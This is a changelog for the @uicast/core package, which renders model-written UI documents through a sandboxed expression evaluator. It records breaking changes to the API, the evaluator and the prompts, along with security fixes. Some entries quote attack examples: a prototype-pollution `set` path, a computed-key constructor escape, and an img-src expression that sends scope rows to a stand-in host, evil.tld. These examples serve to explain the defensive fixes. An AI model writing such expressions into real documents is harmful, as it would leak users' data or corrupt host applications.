# Changelog

All notable changes to this package will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Changed

- **Breaking: the public entry is only what a host writes against.** `checkUrl`, `findUrlViolations`, `schemaHasUrlFormat`, `UrlCheck`, `UrlViolation`, `isComponentListEntry` and `CALLBACK_DEBOUNCE_MS` moved to `@uicast/core/internal`. `UrlPolicy` stays public — a host declares it. The index is the document format, the definition factory, the scope and stream helpers, and `EntryError`.
- **A scope is one shallow proxy; a `set` names one field.** `createProxyScope` no longer wraps nested objects: everything under a field is plain data, a write replaces the field and emits it, and `$set(field, value)` takes a field, not a path. Subscriptions are per field — a write to `scopes.root.user` wakes a reader of `scopes.root.user.name` — so `extractDeps` returns `scopes.<scope>.<field>` keys and `planStepWaves` compares them. The `set` address grammar is `scopes.<scope>.<field>`, checked by `parseSetAddress` / `findEntrySetAddressFault` (replacing `validate-set-path`); anything deeper, a number, a missing `scopes.` prefix, a prototype name or one of the runtime's row fields is a `guardrail-violation` at mount.
- **Row scopes are windows onto array elements.** `createRowScope` (internal) reads the element's own fields plus `$index`, `$id` and, for a primitive element, `$value`; a write changes the element in place and emits on every scope field that holds it, found by identity, so nested lists and two lists over one array stay consistent. A row whose element is in no scope field (`each` built new objects, or the row was removed) refuses the write as `unknown-reference`. `childScopes` is gone.
- The prompt's host-call examples pass the data field (`scopes.row.id`). `$id` keys per-row UI maps; it is the `keyBy` value, or the index without `keyBy`.
- **A whole-scope read subscribes to every field of it.** `extractDeps` returns `scopes.<scope>.*` for `Object.keys(scopes.root)` or a bare `scopes.row`, where it returned nothing, and `planStepWaves` makes such a read wait for any write into that scope.
- A row held in an object of arrays (`scopes.root.byCustomer[id]`) can be written: a scope field holds an element one level down through an object's array values too.
- **The prompt prints a schema's constraints.** `integer`, bounds, `multipleOf`, lengths, `format` (or `pattern` without one), item counts, `uniqueItems` and `default` follow the description in the field's comment (`limit?: number /* Rows to return. integer, ≥ 1, ≤ 200, default 50 */`), so a model calls a function within its validators instead of learning them from validation errors. The `±MAX_SAFE_INTEGER` bounds a bare `.int()` stamps are not printed. A component prop still prints its own default as ` = value` after the type.
- The prompt tells the model to use a function's window, sort and filters when it offers them and to read returned aggregates instead of reducing over rows (§9); §6 pages through the function's own window before slicing a seeded array. A fetched window may be filtered or sorted locally only when it holds every matching row. A callback step's target keeps its old value until a call resolves; the prompt shows the placeholder-then-call pattern for loading states.

- **`ConfirmableValueSourceAssignment` is `CallbackValueSourceAssignment`.** Same shape, plus `debounce`.
- **The host provides the evaluator.** `evaluate(expr, context, evaluator)` takes an `ExpressionEvaluator` — the interface from `@uicast/expr` that `Evaluator` and `PassthroughEvaluator` implement, re-exported here. An evaluator of your own can implement it too, for any language. The `functions` / `evaluator: "native"` / `maxExpressionLength` options are gone; core constructs no evaluator and imports nothing from `@uicast/expr` at run time (an `ExpressionError` is recognized by its brand). Its host-function name screen now refuses only uicast's own names (`scopes`, `evt`, `currentValue`); identifier validity is the evaluator's check and the globals collision the prompt builder's. `extractDeps(entry, evaluator, part?)` and `planStepWaves(steps, evaluator, …)` take the same instance, so analysis and evaluation share one parse cache and one `maxSourceLength`; the earlier mismatch between the two caps is gone by construction. `getFreeIdentifiers` and `EvaluatorMode` are removed from `@uicast/core/internal`.
- uicast's own host-function name screen (`scopes`, `evt`, `currentValue`, the globals) runs once per evaluator instance, on `evaluator.functions`; identifier validity is the evaluator's own check, at construction.
- **A `set` path without the `scopes.` prefix was invisible to wave planning** — reads come back prefixed, writes were compared as written, and a reader could land in the same wave as its writer. Both sides are normalised.
- Tool names are screened against the array's contents right before they are bound, not once per array identity — an array mutated after first use no longer binds unscreened. Identifier validity and duplicates are the evaluator's own checks now; core keeps only the `scopes` / `evt` / `currentValue` and global-collision rules.
- The recovery prompt's description of a `guardrail-violation` names the budget, so a step, time, or allocation refusal is no longer described to the model as a syntax error.
- A function's call signature no longer wraps an intersection or union input in a second pair of parentheses: `listOrders(Window & { … })`, not `listOrders((Window & { … }))`.
- Compiled to ES2022.

### Added

- **`loading` on an entry.** A bare expression like `hidden`: while truthy the element renders as busy. Reactive (`extractDeps` subscribes to it), passed to the implementation by the React binding. The prompt teaches the flag-around-the-fetch pattern (§8).
- **`debounce` on a callback step.** `{ "debounce": true }` makes that step and every step after it wait 300 ms of quiet, running once with the latest `evt`; the steps before it run at once. The prompt teaches it for search-as-you-type (§7).
- **`getExpressionsPartialPrompt()` moves here** from `@uicast/expr/prompt`, so every partial but the Streamdown fence comes from one import. The globals and length slots still fill from `@uicast/expr`'s own constants, and a new test fails if the markdown advertises a method the grammar would refuse — the drift this file's location exists to prevent.

### Changed

- **Host functions are bound by `@uicast/expr` now.** The tools array selects a cached evaluator instead of being wrapped per call, so `wrapTools` and its WeakMap are gone. The evaluator validates each call's input and output against the tool's own schemas, which replaces the structural sniff for `StandardToolValidationError` — an input rejection is `invalid-arguments` (document fault) because it names a real declared schema, not because of an error's name. A host function that throws its own `EntryError` still reaches `onError` unchanged.
- The expression-reason mapping is a total table rather than a ternary chain, so a reason added in `@uicast/expr` fails this build instead of arriving unmapped.


### Changed

- **`getExpressionsPartialPrompt` moved to `@uicast/expr`.** The syntax, method list, and globals now live next to the grammar and membrane that enforce them — a contract in a different package from the thing it describes drifts silently, which is exactly what happened before (the old file still advertised block-bodied arrows after the grammar had removed them). What was uicast's own in that block — `scopes`, `evt`, `currentValue`, the host-function calling rule — is now the `# Expression Context` section of `INSTRUCTIONS.md`, so `getCommonInstructionsPartialPrompt()` carries it and no separate builder exists. Assemble the language partial from its new home:

  ```ts
  getCommonInstructionsPartialPrompt(), // @uicast/core/prompt — contract + expression context
  getExpressionsPartialPrompt(),        // @uicast/expr/prompt — the language
  ```

- **Every `get*PartialPrompt` builder takes `note?`** — host-specific context rendered as that section's trailing `## Note`, verbatim. It replaces `extraScopes`: declare an injected scope via `getCommonInstructionsPartialPrompt({ note })`, which lands right under `# Expression Context`.

- **The expression evaluator moved to `@uicast/expr`, and no longer uses `new Function`.** Expressions are parsed once, checked against a closed AST allow-list, and compiled to a tree of closures; every property read and every call passes a runtime membrane, and every iteration a step/time/allocation budget. This closes the computed-key escape class (`obj["con"+"structor"]`) that a static pass could not, and removes the CSP `unsafe-eval` requirement — uicast now runs under a strict Content-Security-Policy. `core/src/expr/{safer-eval,validate,analyze,globals,ast-utils}.ts` are gone; `evaluate.ts` keeps host-function binding and `EntryError` classification.
- **The expression grammar is narrower.** No statements (so no `while`/`for`/`try`), no declarations or `function` keyword (so nothing can recurse), no assignment, no regular expressions, and a callback body must be a single expression — `items.map(x => x.name)`, not `items.map(x => { return x.name })`. `EXPRESSIONS.md` and its JSON mirror are updated to match; every expression in the shipped demo documents validates unchanged.
- The grammar drops `in`, the bitwise operators, and optional *calls* (`x?.()`); `.sort()` / `.reverse()` return a new array instead of mutating. The `evaluator` prop on `RendererProvider` selects the back end (`"interpret"` default, or `"native"` for trusted-author documents); the dead `allowGlobals` prop is removed.
- **The expression language is smaller still.** `await` is rejected (the runtime awaits host results; the prompt already said never to write it); `.sort()` / `.reverse()` are replaced by the standard non-mutating `.toSorted()` / `.toReversed()`, so immutability is structural in both back ends and the last deliberate divergence from plain JavaScript is gone; a dozen formatting methods nothing used are cut, and written method calls are now checked by the shared validator so `interpret` and `native` refuse identical sets.
- `acorn` is no longer a dependency of core — all parsing lives in `@uicast/expr`.
- `@uicast/expr` is a **peer dependency** of core, not a regular one: hosts import its prompt partial directly (`getExpressionsPartialPrompt`), and a single shared copy keeps the evaluator, the prompt, and `instanceof ExpressionError` checks on one instance.
- `evaluate` takes `maxExpressionLength` (default 1000), threaded from the renderer; an oversized expression is rejected before parsing as a classified document fault.
- **The prompt bounds list size.** A new rule in `INSTRUCTIONS.md` §6: never render an unbounded array — cap the visible slice, page through state, and reach the rest with search or a filter. The cap is `maxListItems` on `getCommonInstructionsPartialPrompt` (default 100). Rendering thousands of rows stalls the browser at paint, which no expression budget can prevent.
- **One host-function-name screen at both seams.** `evaluate` and `getFunctionsPartialPrompt` now share a rule built on `@uicast/expr/internal`'s `isUsableName`, plus uicast's own reserved names. Each previously had half the check: the prompt builder advertised names no expression can call (`foo-bar`), and `evaluate` accepted names that silently shadow `scopes` / `evt` / `currentValue` or an expression global such as `Math`. All four cases now fail fast with a host-blamed error.

### Fixed

- **Prototype pollution through a step's `set` path.** `{"set": "scopes.root.__proto__.x"}` walked out of the scope object and wrote to the host application's `Object.prototype`. Prototype-reaching segments (`__proto__`, `constructor`, `prototype`, the `__define*__`/`__lookup*__` pairs) are now rejected statically by `findSetPathFault` and again at the sink in `createProxyScope.set()`.

### Added

- `UrlPolicy`, `checkUrl`, and `findUrlViolations`: props a component definition declares as URLs (JSON Schema `format: "uri"` / `"uri-reference"`) are validated before the implementation sees them. Relative, same-origin, and raster `data:` images by default; `image/svg+xml` is excluded because SVG can carry script. Without this, a document could put `"https://evil.tld/?d=" + JSON.stringify(scopes.root.rows)` into an `<img src>` and the browser would send it on render — an exfiltration channel needing no evaluator escape.
- Initial public beta of the framework-agnostic uicast engine: entry format, JavaScript expressions evaluated by `@uicast/expr`, reactive scopes, and the prompt partial builders (`@uicast/core/prompt`). Binding plumbing lives in `@uicast/core/internal`, which carries no semver guarantee.
